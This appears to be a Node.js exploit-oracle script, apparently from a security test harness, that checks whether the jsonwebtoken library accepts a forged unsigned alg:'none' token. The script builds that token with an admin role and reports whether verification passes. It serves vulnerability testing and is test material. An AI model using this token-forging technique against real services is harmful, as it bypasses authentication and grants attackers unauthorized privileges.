'use strict';
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let jwt;
try {
  jwt = require('jsonwebtoken');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'jwt-none-alg-oracle-' + process.pid + '-' + Date.now();
let tmpDir;
try {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), marker + '-'));
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'tmp setup failed: ' + String(e && e.message) });
  process.exit(0);
}

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const serverSecret = 'super-secret-server-key-' + marker;

  // --- Benign operation: normal HS256 sign + verify round trip. ---
  const benignPayload = { sub: 'user123', role: 'guest', marker };
  let benignToken;
  try {
    benignToken = jwt.sign(benignPayload, serverSecret, { algorithm: 'HS256', expiresIn: '5m' });
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign sign failed unexpectedly: ' + String(e && e.message) });
    process.exit(0);
  }

  let benignDecoded;
  try {
    benignDecoded = jwt.verify(benignToken, serverSecret, { algorithms: ['HS256'] });
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign verify failed unexpectedly: ' + String(e && e.message) });
    process.exit(0);
  }

  if (!benignDecoded || benignDecoded.sub !== 'user123' || benignDecoded.marker !== marker) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign verify returned unexpected payload' });
    process.exit(0);
  }

  const fixturePath = path.join(tmpDir, 'benign-token.txt');
  fs.writeFileSync(fixturePath, benignToken);

  operation_completed = true;

  // --- Malicious operation: craft an attacker-controlled alg:'none' token and verify ---
  // it against the server secret WITHOUT specifying an `algorithms` allow-list,
  // mirroring real-world misuse: jwt.verify(token, secret).
  function base64url(input) {
    return Buffer.from(input).toString('base64')
      .replace(/=+$/, '')
      .replace(/\+/g, '-')
      .replace(/\//g, '_');
  }

  const forgedHeader = { alg: 'none', typ: 'JWT' };
  const forgedPayload = { sub: 'attacker', role: 'admin', marker: marker + '-forged' };
  const forgedToken =
    base64url(JSON.stringify(forgedHeader)) + '.' +
    base64url(JSON.stringify(forgedPayload)) + '.'; // empty signature segment

  let forgedDecoded = null;
  let verifyThrew = false;
  let verifyError = null;
  try {
    forgedDecoded = jwt.verify(forgedToken, serverSecret);
  } catch (e) {
    verifyThrew = true;
    verifyError = e;
  }

  if (verifyThrew) {
    exploit_succeeded = false;
    evidence = 'forged alg:none token was rejected by jwt.verify (blocked): ' + String(verifyError && verifyError.message);
  } else if (forgedDecoded && forgedDecoded.role === 'admin' && forgedDecoded.marker === marker + '-forged') {
    exploit_succeeded = true;
    evidence = 'jwt.verify accepted an unsigned alg:none forged token without requiring an algorithms allow-list; decoded payload: ' + JSON.stringify(forgedDecoded);
  } else {
    exploit_succeeded = false;
    evidence = 'forged token verify did not return expected forged admin payload: ' + JSON.stringify(forgedDecoded);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'unexpected exception: ' + String(e && e.stack || e) });
} finally {
  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch (_) { /* ignore cleanup errors */ }
}
